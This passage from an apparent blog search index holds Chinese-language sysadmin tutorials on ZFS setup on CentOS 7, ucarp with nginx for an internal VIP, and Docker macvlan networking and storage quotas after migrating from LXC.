增加热备盘spare\n[root@localhost /]# zpool add zfspool spare sdg\r[root@localhost /]# zpool status\rpool: zfspool\rstate: ONLINE\rscan: none requested\rconfig:\rNAME STATE READ WRITE CKSUM\rzfspool ONLINE 0 0 0\rraidz2-0 ONLINE 0 0 0\rsdb ONLINE 0 0 0\rsdc ONLINE 0 0 0\rsde ONLINE 0 0 0\rsdf ONLINE 0 0 0\rspares\rsdg AVAIL errors: No known data errors 如果出现坏盘，用好盘sdf换掉坏盘sde\n[root@localhost /]# zpool replace zfspool sde sdf\r[root@localhost /]# zpool status\rpool: zfspool\rstate: ONLINE\rscan: resilvered 1.17M in 0 days 00:00:00 with 0 errors on Thu Mar 11 20:02:19 2021\rconfig:\rNAME STATE READ WRITE CKSUM\rzfspool ONLINE 0 0 0\rraidz2-0 ONLINE 0 0 0\rsdb ONLINE 0 0 0\rsdc ONLINE 0 0 0\rsdf ONLINE 0 0 0\rspares\rsdg AVAIL errors: No known data errors 检查zpool磁盘组的完整性\nzpool scrub testpool 增加cache会增加读速度，类似盘阵热点SSD自动落盘技术\n$ zpool create mirror /dev/sda /dev/sdb cache /dev/sdk /dev/sdl 增加log会提高写速度，类似盘阵热点SSD自动落盘技术\n$ zpool create mirror /dev/sda /dev/sdb log /dev/sdk /dev/sdl zpool 建立好zfspool后，可以建文件系统\nzfs create zfspool/dba-vol\r[root@localhost /]# zfs list\rNAME USED AVAIL REFER MOUNTPOINT\rzfspool 1.47M 35.2T 153K /zfspool\rzfspool/dba-vol 262K 35.2T 160K /zfspool/dba-vol 修改挂载点\nzfs set mountpoint=/path/to/mount zpool-name/dataset-name 快照\nzfs snapshot [pool]/[dataset name]@[snapshot name] zfs snapshot zfspool/dba-vol@dba-vol-20210315\rzfs list -t snapshot 注意，快照恢复后，该时间点之后的快照会全部丢失\rzfs rollback -r [pool]/[dataset]@[snapshot name] zfs rollback -r zfspool/dba-vol@dba-vol-20210315 ","permalink":"https://rendoumi.com/posts/20231215-zfs_centos/","summary":"\u003cp\u003ezfs用来顶替Raid控制卡，有相当强悍的性能，TrueNAS用的就是这玩意。\u003c/p\u003e\n\u003cp\u003e官方安装文档：\n\u003ca href=\"https://openzfs.github.io/openzfs-docs/Getting%20Started/RHEL%20and%20CentOS.html\"\u003ehttps://openzfs.github.io/openzfs-docs/Getting%20Started/RHEL%20and%20CentOS.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eCentOS7安装\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eyum install -y epel-release\r\nyum install -y https://zfsonlinux.org/epel/zfs-release.el7_9.noarch.rpm\r\nyum install -y kernel-devel zfs\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e加载模块\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[root@localhost ~]# lsmod|grep zfs\r\n\r\n[root@localhost ~]# modprobe zfs\r\n\r\n[root@localhost ~]# lsmod|grep zfs\r\nzfs                  3986850  0 \r\nzunicode              331170  1 zfs\r\nzlua                  151525  1 zfs\r\nzcommon                89551  1 zfs\r\nznvpair                94388  2 zfs,zcommon\r\nzavl                   15167  1 zfs\r\nicp                   301854  1 zfs\r\nspl                   104299  5 icp,zfs,zavl,zcommon,znvpair\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e看看文件系统\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[root@localhost ~]#  zfs list\r\nno datasets available\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e192.168.85.100的本地磁盘从sdb 一直到 sdg，首先zpool建立池子，类似raid卡的功能\n然后再zfs建立文件系统\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[root@localhost ~]# zpool create -f zfspool sdb sdc sdd sde sdf sdg\r\n\r\n[root@localhost ~]# zpool status\r\n  pool: zfspool\r\n state: ONLINE\r\n  scan: none requested\r\nconfig:\r\n\r\n        NAME        STATE     READ WRITE CKSUM\r\n        zfspool     ONLINE       0     0     0\r\n          sdb       ONLINE       0     0     0\r\n          sdc       ONLINE       0     0     0\r\n          sdd       ONLINE       0     0     0\r\n          sde       ONLINE       0     0     0\r\n          sdf       ONLINE       0     0     0\r\n          sdg       ONLINE       0     0     0\r\n\r\nerrors: No known data errors\r\n\r\n[root@localhost ~]# df -h\r\n文件系统                 容量  已用  可用 已用% 挂载点\r\ndevtmpfs                  63G     0   63G    0% /dev\r\ntmpfs                     63G     0   63G    0% /dev/shm\r\ntmpfs                     63G  9.9M   63G    1% /run\r\ntmpfs                     63G     0   63G    0% /sys/fs/cgroup\r\n/dev/mapper/centos-root   50G  1.7G   49G    4% /\r\n/dev/sda1               1014M  189M  826M   19% /boot\r\n/dev/mapper/centos-home  392G   33M  392G    1% /home\r\ntmpfs                     13G     0   13G    0% /run/user/0\r\nzfspool                   53T  128K   53T    1% /zfspool\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面对生产无意义，没有任何冗余的配置在生产是行不通的\u003c/p\u003e","title":"CentOS7安装ZFS"},{"content":"ucarp我们来实战一下完成ucarp+nginx做内网vip，模拟F5的vip的方法\nucarp的安装参考之前的文章，环境如下：\nucarp1：192.168.19.1 ucarp2：192.168.19.2 vip：172.18.19.10 在172.18.19.1和172.18.19.2上编译Nginx 1.16.1\n./configure --prefix=/export/servers/nginx1161 --with-stream --with-stream_ssl_module make make install 重点是/export/servers/nginx1161/conf/nginx.conf\ncat /export/servers/nginx1161/conf/nginx.conf user nobody; worker_processes auto; events { use epoll; worker_connections 65535; } stream { log_format proxy \u0026#39;$remote_addr [$time_local] \u0026#39; \u0026#39;$protocol $status $bytes_sent $bytes_received \u0026#39; \u0026#39;$session_time \u0026#34;$upstream_addr\u0026#34; \u0026#39; \u0026#39;\u0026#34;$upstream_bytes_sent\u0026#34; \u0026#34;$upstream_bytes_received\u0026#34; \u0026#34;$upstream_connect_time\u0026#34;\u0026#39;; } access_log logs/tcp-access.log proxy ; open_log_file_cache off; upstream stream_backend01 { hash $remote_addr consistent; #server 172.18.31.2:80 weight=5; server 172.18.31.2:80 max_fails=2 fail_timeout=30s; #server 172.18.31.2:80 max_conns=3; } server { listen 172.18.19.10:80; proxy_timeout 20s; proxy_pass stream_backend01; } } 注意： 1、打出了tcp-access.log 2、根据源IP做hash，强制分配到后面的同一台服务器上，保证一致性 3、后端的server可以有权重，最大连接，以及失效检测（30s内无法连通2次，就摘掉这个服务器）\n同时调整vip-up.sh\ncat /usr/local/bin/vip-up.sh #!/bin/sh /sbin/ip addr add ${2}/24 dev ${1} /sbin/ip neigh flush dev ${1} /export/servers/nginx/sbin/nginx /export/servers/nginx/sbin/nginx -s reload 谁获得了主ip 172.18.19.10，谁就会启动nginx，并且强制刷一下配置\n注意，一开始的时候，由于172.18.19.2没有获得主ip 172.18.19.10，所以上面是不会自动起nginx进程的！！！\n测试一下：\n在172.18.19.1上面 kill -usr2 ucarp的进程pid 看172.18.19.2上面，nginx已经自动启动了 然后访问 curl http://172.18.19.10/ ok\n","permalink":"https://rendoumi.com/posts/20231214-ucarp_nginx/","summary":"\u003cp\u003eucarp我们来实战一下完成ucarp+nginx做内网vip，模拟F5的vip的方法\u003c/p\u003e\n\u003cp\u003eucarp的安装参考之前的文章，环境如下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eucarp1：192.168.19.1\u003c/li\u003e\n\u003cli\u003eucarp2：192.168.19.2\u003c/li\u003e\n\u003cli\u003evip：172.18.19.10\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e在172.18.19.1和172.18.19.2上编译Nginx 1.16.1\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ./configure --prefix\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/servers/nginx1161 --with-stream --with-stream_ssl_module\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\tmake\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\tmake install\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e重点是/export/servers/nginx1161/conf/nginx.conf\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /export/servers/nginx1161/conf/nginx.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  user  nobody\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  worker_processes  auto\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  events \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    use epoll\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    worker_connections  65535\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  stream \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  log_format proxy \u003cspan class=\"s1\"\u003e\u0026#39;$remote_addr [$time_local] \u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               \u003cspan class=\"s1\"\u003e\u0026#39;$protocol $status $bytes_sent $bytes_received \u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               \u003cspan class=\"s1\"\u003e\u0026#39;$session_time \u0026#34;$upstream_addr\u0026#34; \u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#34;$upstream_bytes_sent\u0026#34; \u0026#34;$upstream_bytes_received\u0026#34; \u0026#34;$upstream_connect_time\u0026#34;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  access_log logs/tcp-access.log proxy \u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  open_log_file_cache off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  upstream stream_backend01 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003ehash\u003c/span\u003e \u003cspan class=\"nv\"\u003e$remote_addr\u003c/span\u003e consistent\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e#server 172.18.31.2:80 weight=5;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server 172.18.31.2:80 \u003cspan class=\"nv\"\u003emax_fails\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e \u003cspan class=\"nv\"\u003efail_timeout\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e30s\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e#server 172.18.31.2:80 max_conns=3;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  server \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        listen 172.18.19.10:80\u003cspan class=\"p\"\u003e;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_timeout 20s\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_pass stream_backend01\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e   \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意：\n1、打出了tcp-access.log\n2、根据源IP做hash，强制分配到后面的同一台服务器上，保证一致性\n3、后端的server可以有权重，最大连接，以及失效检测（30s内无法连通2次，就摘掉这个服务器）\u003c/p\u003e","title":"Ucarp和nginx提供内网vip"},{"content":"在k8s没有出来之前，我们用的就是LXC，古早版本了。\n跑的LXC，基于docker进行管理，网络部分独立。\n进化到新版本的Docker后，网络部分需要修改，我们决定采用macvlan方式扁平直接接入本地网络：\nDocker装好以后，系统中会出现一个Docker0的网络，用来NAT，我们不用这个\n2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 52:54:00:14:ee:63 brd ff:ff:ff:ff:ff:ff inet 172.18.31.33/24 brd 172.18.31.255 scope global eth0 valid_lft forever preferred_lft forever 3: docker0: \u0026lt;NO-CARRIER,BROADCAST,MULTICAST,UP\u0026gt; mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:ef:af:de:98 brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever 我们要做的是对eth0做macvlan，不做任何iptable，直接接入本地网络\n宿主机ip: 172.18.31.33 Docker1: 172.18.31.35\n一、建macvlan\ndocker network create -d macvlan \\ --subnet=172.18.31.0/24 --gateway=172.18.31.254 \\ -o parent=eth0 \\ macvlan0 docker network ls docker inspect macvlan0 会看到\n... \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.18.31.0/24\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.18.31.254\u0026#34; } ] 二、按指定ip建立容器\ndocker run --rm -dit --name=t35 --net macvlan0 --ip=172.18.31.35 alpine:latest ash 随后我们可以用docker exec取得shell\ndocker exec -it t35 ash ip a ping 172.18.31.35 ping 172.18.31.2 注意：这个时候从宿主机ping容器 ping 172.18.31.35，或者是从容器ping宿主机 ping 172.18.31.33，都是不通的，这是macvlan的特性，我们必须做个操作来解决这个问题\n三、解决宿主机和容器之间的网络问题\n给eth0做个子接口，解决宿主机和容器之间的通讯问题\nip link add macvlan0-shim link eth0 type macvlan mode bridge ip addr add 172.18.31.34/32 dev macvlan0-shim ip link set macvlan0-shim up ip route add 172.18.31.0/24 dev macvlan0-shim 这样就可以通了\n注意，这样宿主机占了两个IP，eth0子接口的ip不能胡乱，必须跟独立ip同段。 浪费了一个IP，但是解决了宿主机和容器之间的网络问题。\n","permalink":"https://rendoumi.com/posts/20231214-lxc_ip/","summary":"\u003cp\u003e在k8s没有出来之前，我们用的就是LXC，古早版本了。\u003c/p\u003e\n\u003cp\u003e跑的LXC，基于docker进行管理，网络部分独立。\u003c/p\u003e\n\u003cp\u003e进化到新版本的Docker后，网络部分需要修改，我们决定采用macvlan方式扁平直接接入本地网络：\u003c/p\u003e\n\u003cp\u003eDocker装好以后，系统中会出现一个Docker0的网络，用来NAT，我们不用这个\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu \u003cspan class=\"m\"\u003e1500\u003c/span\u003e qdisc pfifo_fast state UP group default qlen \u003cspan class=\"m\"\u003e1000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    link/ether 52:54:00:14:ee:63 brd ff:ff:ff:ff:ff:ff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    inet 172.18.31.33/24 brd 172.18.31.255 scope global eth0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e       valid_lft forever preferred_lft forever\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3: docker0: \u0026lt;NO-CARRIER,BROADCAST,MULTICAST,UP\u0026gt; mtu \u003cspan class=\"m\"\u003e1500\u003c/span\u003e qdisc noqueue state DOWN group default \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    link/ether 02:42:ef:af:de:98 brd ff:ff:ff:ff:ff:ff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e       valid_lft forever preferred_lft forever\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我们要做的是对eth0做macvlan，不做任何iptable，直接接入本地网络\u003c/p\u003e\n\u003cp\u003e宿主机ip: 172.18.31.33\nDocker1: 172.18.31.35\u003c/p\u003e\n\u003cp\u003e一、建macvlan\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker network create -d macvlan \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --subnet\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.18.31.0/24 --gateway\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.18.31.254 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    -o \u003cspan class=\"nv\"\u003eparent\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eeth0 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    macvlan0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker network ls\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker inspect macvlan0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e会看到\u003c/p\u003e","title":"LXC更新到Docker之后的IP部分修改"},{"content":"在k8s没有出来之前，我们用的就是LXC，古早版本了。\n那时候是1：60的虚拟，一台物理机上跑60个LXC，居然这样运行了8年无异常，现在要升级一下了。\n那时候的LXC，存储空间无法单独设定（缺省10G），cpu和mem的limit也有这样那样的问题。\n进化到新版本的Docker后，存储部分也需要修改，我们采用overlay2：\ndocker info ... Storage Driver: overlay2 Backing Filesystem: xfs Supports d_type: true Native Overlay Diff: true ... 缺省的就是overlay2和xfs\n一、修改boot内核启动参数\nvi /etc/default/grub #加上rootflags=uquota,pquota GRUB_CMDLINE_LINUX=\u0026#34;console=tty0 crashkernel=auto net.ifnames=0 console=ttyS0 rootflags=uquota,pquota\u0026#34; #更新 grub2-mkconfig -o /boot/grub2/grub.cfg #重启 reboot 二、检验并启动容器\ncat /proc/mounts |grep vda /dev/vda1 / xfs rw,relatime,attr2,inode64,usrquota,prjquota 0 0 有prjquota即可\n按需启动容器，指定空间大小，size=2G\ndocker run --rm -dit --name=t36 --storage-opt size=2G --net macvlan0 --ip=172.18.31.36 alpine:latest ash docker exec -it t36 ash df -h 这样就可以单独限制容器的大小了。\n","permalink":"https://rendoumi.com/posts/20231214-lxc_storage/","summary":"\u003cp\u003e在k8s没有出来之前，我们用的就是LXC，古早版本了。\u003c/p\u003e\n\u003cp\u003e那时候是1：60的虚拟，一台物理机上跑60个LXC，居然这样运行了8年无异常，现在要升级一下了。\u003c/p\u003e\n\u003cp\u003e那时候的LXC，存储空间无法单独设定（缺省10G），cpu和mem的limit也有这样那样的问题。\u003c/p\u003e\n\u003cp\u003e进化到新版本的Docker后，存储部分也需要修改，我们采用overlay2：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker info\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e Storage Driver: overlay2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Backing Filesystem: xfs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Supports d_type: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Native Overlay Diff: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e缺省的就是overlay2和xfs\u003c/p\u003e\n\u003cp\u003e一、修改boot内核启动参数\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/default/grub\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#加上rootflags=uquota,pquota\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eGRUB_CMDLINE_LINUX\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;console=tty0 crashkernel=auto net.ifnames=0 console=ttyS0 rootflags=uquota,pquota\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#更新\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrub2-mkconfig -o /boot/grub2/grub.cfg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#重启\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ereboot\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e二、检验并启动容器\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /proc/mounts  \u003cspan class=\"p\"\u003e|\u003c/span\u003egrep vda\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/vda1 / xfs rw,relatime,attr2,inode64,usrquota,prjquota \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e有prjquota即可\u003c/p\u003e\n\u003cp\u003e按需启动容器，指定空间大小，size=2G\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run --rm -dit --name\u003cspan class=\"o\"\u003e=\u003c/span\u003et36 --storage-opt \u003cspan class=\"nv\"\u003esize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e2G --net macvlan0 --ip\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.18.31.36 alpine:latest ash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker \u003cspan class=\"nb\"\u003eexec\u003c/span\u003e -it t36 ash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edf -h\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231214-lxc_storage/2020-08-24_104720.png\"\u003e\u003c/p\u003e","title":"LXC更新到Docker之后的存储部分修改"},{"content":"kvm生产的虚机内仍然可以再产虚拟机，这就是嵌套虚拟化\n我们的目的是要再kvm虚机中安装一套proxmox的系统\n首先在实体机上检查当前的Linux是否支持嵌套\nIntel的CPU 